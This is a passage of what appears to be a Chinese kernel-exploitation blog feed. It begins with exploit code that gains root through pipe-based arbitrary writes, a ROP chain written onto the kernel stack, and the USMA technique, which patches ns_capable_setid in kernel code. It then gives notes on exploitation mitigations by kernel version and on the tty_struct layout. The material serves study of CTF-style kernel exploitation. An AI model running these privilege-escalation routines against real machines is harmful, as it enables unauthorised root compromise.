write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">         temp_zero_buf, </span><br><span class="line">         TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* write data into dst page */</span></span><br><span class="line">   write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line">   get_root_shell();</span><br></pre></td></tr></table></figure><h3 id="覆写内核栈"><a href="#覆写内核栈" class="headerlink" title="覆写内核栈"></a>覆写内核栈</h3><p>覆写内核栈实现rop自然不是什么少见的利用手法,但是这里<code>arttnba3</code>大佬找到内核栈的方法还是第一次见</p><p>学习一下</p><blockquote><p> 由于 page 结构体数组与物理内存页一一对应的缘故，我们可以很轻易地在物理地址与 page 结构体地址间进行转换，而在页表当中存放的是物理地址，我们不难想到的是<strong>我们可以通过解析当前进程的页表来获取到内核栈的物理地址，从而获取到内核栈对应的 page</strong>，之后我们可以<strong>直接向内核栈上写 ROP chain 来完成任意代码执行</strong></p><p>页表的地址可以通过 <code>mm_struct</code> 获取， <code>mm_struct</code> 地址可以通过 <code>task_struct</code> 获取，内核栈地址同样可以通过 <code>task_struct</code> 获取，那么这一切其实是水到渠成的事情：</p></blockquote><p>简单来说就是获取栈对应的<code>page</code>,然后在页上布置gadget</p><p>因为栈上是ret调用gadget,所以绕过了CFI</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_rop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>], idx = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* reading the page table directly to get physical addr of kernel stack*/</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);</span><br><span class="line">    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="comment">/* N/X bit */</span></span><br><span class="line">    stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct the ROP */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++) &#123;</span><br><span class="line">        rop[idx++] = RET + kernel_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">    rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="number">54</span> + kernel_offset;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) get_root_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br></pre></td></tr></table></figure><p>虽然<code>arttnba3</code>大佬选择自己重新解析stack的地址stack_addr_another,但实际上直接使用stack_addr也是能够成功的</p><h4 id="虚拟地址翻译"><a href="#虚拟地址翻译" class="headerlink" title="虚拟地址翻译"></a>虚拟地址翻译</h4><p>虽然5级页表也已经挺成熟了,但现在大多数的x86机器依然是4级页表</p><p>即<code>pgd,pud,pmd,pte</code>,四级页表只使用48位,除去12位的页内偏移,剩下的36位,四级页表平分各9位</p><p>kernel pwn中遇到的也主要是四级页表</p><p>我们知道cr3寄存器存储的是pgd基址的物理内存地址,每个进程都有自己的页表,在上下文切换时,当前进程的cr3寄存器会被存入<code>task_struct-&gt;mm-&gt;pgd</code>,不过存的并不是物理地址,而是pgd在直接映射区的地址,当然<strong>直接映射区的地址减去<code>page_offset_base</code>就是物理内存地址了</strong></p><p>一般来说,一个页表有512个条目,每个条目占8字节,也就是说一个页表刚好占据一个页框,除pgd只有一个页表外,剩下的三级页表可能都会有多个页表</p><p><code>pgd,pud,pmd</code>前三级页表条目的组成如下</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/clipboard.png" alt=""></p><p><code>pte</code>的页表条目如下</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/clipboard%202.png" alt=""></p><p>PTE 有三个权限位，控制对页的访问。R/W 控制是只读还是读写；U/S 控制用户模式是否可以访问；XD 用来禁止从某些页读指令。</p><p>每次访问一个页，MMU 都会设置 A 位，称为引用位。内核可以利用这个引用位实现它的页替换算法。</p><p>每次写了一个页后，MMU 都会设置 D 位，称为修改位。修改位告诉内核在替换该页前是否必须写回牺牲页。</p><p>内核可以通过调用一条特殊的内核模式指令来清除引用位或修改位</p><p><strong>特别注意:</strong>在<code>pmd</code>表中,其页表项可能会置<code>PS</code>位,这代表<strong>不存在第四级页表<code>pte</code></strong>,而是将<code>pmd</code>表项的物理基地址对应物理内存直接当做一个大页,虚拟地址的后21位当作偏移,此外虽然上图显示是<code>4M</code>页,但实际上因为只剩下了21位,所以实际上是<code>2M</code>页,在内核页表中页表项物理基址也确实是以<code>2M</code>为单位增加的</p><p><code>大页pmd:(基址增加单位2m)</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0xffff9480c0000000+0xa202000+22*8</span><br><span class="line">00:0000│  0xffff9480ca2020b0 ◂— 0x8000000002c000e3</span><br><span class="line">01:0008│  0xffff9480ca2020b8 ◂— 0x2e29063</span><br><span class="line">02:0010│  0xffff9480ca2020c0 ◂— 0x80000000030000e3</span><br><span class="line">03:0018│  0xffff9480ca2020c8 ◂— 0x80000000032000e3</span><br><span class="line">04:0020│  0xffff9480ca2020d0 ◂— 0x80000000034000e3</span><br><span class="line">05:0028│  0xffff9480ca2020d8 ◂— 0x80000000036000e3</span><br><span class="line">06:0030│  0xffff9480ca2020e0 ◂— 0x80000000038000e3</span><br><span class="line">07:0038│  0xffff9480ca2020e8 ◂— 0x8000000003a000e3</span><br></pre></td></tr></table></figure><p><code>4k页pmd:</code>(基址增加单位4k)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0xffff9480c0000000+0x2a4f000+268*8</span><br><span class="line">00:0000│  0xffff9480c2a4f860 ◂— 0x8000000002d70063 /* <span class="string">&#x27;c&#x27;</span> */</span><br><span class="line">01:0008│  0xffff9480c2a4f868 ◂— 0x8000000002d71063</span><br><span class="line">02:0010│  0xffff9480c2a4f870 ◂— 0x8000000002d72063</span><br><span class="line">03:0018│  0xffff9480c2a4f878 ◂— 0x8000000002d73063</span><br></pre></td></tr></table></figure><h3 id="USMA"><a href="#USMA" class="headerlink" title="USMA"></a>USMA</h3><p>解析目标内核代码物理地址paddr</p><p>用户mmap映射一段虚拟地址vaddr,然后劫持vaddr的页表的pte表项为paddr</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_usma</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *kcode_map, *kcode_func;</span><br><span class="line">    <span class="type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    kcode_map = mmap((<span class="type">void</span>*) <span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, </span><br><span class="line">                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!kcode_map) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* because of lazy allocation, we need to write it manually */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        kcode_map[i] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">        kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code seg to exec shellcode directly :) */</span></span><br><span class="line">    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">           dst_vaddr);</span><br><span class="line"></span><br><span class="line">    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);</span><br><span class="line">    dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* remapping to our mmap area */</span></span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span>, dst_paddr);</span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span> + <span class="number">0x1000</span>, dst_paddr + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code segment directly */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">     * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>); <span class="comment">/* nop */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>, </span><br><span class="line">            <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="comment">/* endbr64 */</span></span><br><span class="line">            <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="comment">/* mov rax, 1 */</span></span><br><span class="line">            <span class="string">&quot;\xc3&quot;</span>, <span class="comment">/* ret */</span></span><br><span class="line">            <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get root now :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ns_capable_setid</code>函数用于在setreid时判断是否具有权限</p><p>我们劫持其为始终返回<code>1</code>,即拥有任意设置id的权限</p>]]></content>
    
    
    <summary type="html">orz</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>kernel小记</title>
    <link href="https://ixout.github.io/posts/57127/"/>
    <id>https://ixout.github.io/posts/57127/</id>
    <published>2024-03-22T02:22:04.000Z</published>
    <updated>2024-09-28T07:44:27.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="版本相关"><a href="#版本相关" class="headerlink" title="版本相关"></a>版本相关</h1><h2 id="过时"><a href="#过时" class="headerlink" title="过时"></a>过时</h2><h3 id="prepare-kernel-cred-NULL"><a href="#prepare-kernel-cred-NULL" class="headerlink" title="prepare_kernel_cred(NULL)"></a>prepare_kernel_cred(NULL)</h3><p><strong>过时版本:6.2</strong></p><p>自从<strong><u>内核版本 6.2</u></strong> 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，这使得这种提权方法<strong>无法再应用于 6.2 及更高版本的内核：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h3 id="UAF-cred-jar"><a href="#UAF-cred-jar" class="headerlink" title="UAF cred_jar"></a>UAF cred_jar</h3><p><strong>过时版本:4.5</strong></p><p>从4.5版本开始,我们已无法直接分配到 cred_jar 中的 object<strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时(默认开启)</strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">    cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="pt-regs"><a href="#pt-regs" class="headerlink" title="pt_regs"></a>pt_regs</h3><p><strong>过时版本:5.13</strong></p><p><strong>在5.13,内核入栈时添加了一个偏移值,这意味着 pt_regs 与我们触发劫持内核执行流时的栈间偏移值不再是固定值</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span><br><span class="line">index <span class="number">4</span>efd39aacb9f2.<span class="number">.7</span>b2542b13ebd9 <span class="number">100644</span></span><br><span class="line">--- a/arch/x86/entry/common.c</span><br><span class="line">+++ b/arch/x86/entry/common.c</span><br><span class="line">@@ <span class="number">-38</span>,<span class="number">6</span> +<span class="number">38</span>,<span class="number">7</span> @@</span><br><span class="line"> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"> __visible noinstr <span class="type">void</span> <span class="title function_">do_syscall_64</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> nr, <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line"> &#123;</span><br><span class="line">+    add_random_kstack_offset();</span><br><span class="line">     nr = syscall_enter_from_user_mode(regs, nr);</span><br><span class="line"></span><br><span class="line">     instrumentation_begin();</span><br></pre></td></tr></table></figure><h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><p><strong>过时版本:5.11</strong></p><p>在大概<code>5.11</code>版本前后,由于变量<code>sysctl_unprivileged_userfaultfd</code>不再被初识赋值为1,使得userfaultfd不再能被非root用户使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//before</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly=<span class="number">1</span>;</span><br><span class="line"><span class="comment">//now:</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly;</span><br></pre></td></tr></table></figure><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h3><p>Linux 4.15 中引入了 KPTI 机制，并且该机制被反向移植到了 Linux 4.14.11，4.9.75，4.4.110</p><h1 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h1><h2 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty_struct"></a>tty_struct</h2><p><strong>申请obj大小:1k</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:.text泄露|直接映射区泄露|劫持流</strong></p><hr><p>打开一个 tty 设备文件时,内核最终会调用 <code>alloc_tty_struct()</code> 来分配一个 <code>tty_struct</code> 结构体</p><p>一般情况下,我们选择打开<code>/dev/ptmx</code>文件来<strong>分配</strong>一个<code>tty_struct</code>结构体</p><p>关闭该文件即可<strong>释放</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd=open(<span class="string">&quot;/dev/ptmx&quot;</span>);<span class="comment">//分配</span></span><br><span class="line">close(fd);<span class="comment">//释放</span></span><br></pre></td></tr></table></figure><p>该结构体定义于 <code>include/linux/tty.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct tty_struct - state associated with a tty while open</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @flow.lock: lock for flow members</span></span><br><span class="line"><span class="comment"> * @flow.stopped: tty stopped/started by tty_stop/tty_start</span></span><br><span class="line"><span class="comment"> * @flow.tco_stopped: tty stopped/started by TCOOFF/TCOON ioctls (it has</span></span><br><span class="line"><span class="comment"> *              precedense over @flow.stopped)</span></span><br><span class="line"><span class="comment"> * @flow.unused: alignment for Alpha, so that no members other than @flow.* are</span></span><br><span class="line"><span class="comment"> *         modified by the same 64b word store. The @flow&#x27;s __aligned is</span></span><br><span class="line"><span class="comment"> *         there for the very same reason.</span></span><br><span class="line"><span class="comment"> * @ctrl.lock: lock for ctrl members</span></span><br><span class="line"><span class="comment"> * @ctrl.pgrp: process group of this tty (setpgrp(2))</span></span><br><span class="line"><span class="comment"> * @ctrl.session: session of this tty (setsid(2)). Writes are protected by both</span></span><br><span class="line"><span class="comment"> *          @ctrl.lock and legacy mutex, readers must use at least one of</span></span><br><span class="line"><span class="comment"> *          them.</span></span><br><span class="line"><span class="comment"> * @ctrl.pktstatus: packet mode status (bitwise OR of TIOCPKT_* constants)</span></span><br><span class="line"><span class="comment"> * @ctrl.packet: packet mode enabled</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * All of the state associated with a tty while the tty is open. Persistent</span></span><br><span class="line"><span class="comment"> * storage for tty devices is referenced here as @port in struct tty_port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>    magic;<span class="comment">//掩码0x5401</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>    <span class="comment">/* class device or NULL (e.g. ptys, serdev) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>        <span class="comment">/* winsize_mutex */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="type">bool</span> 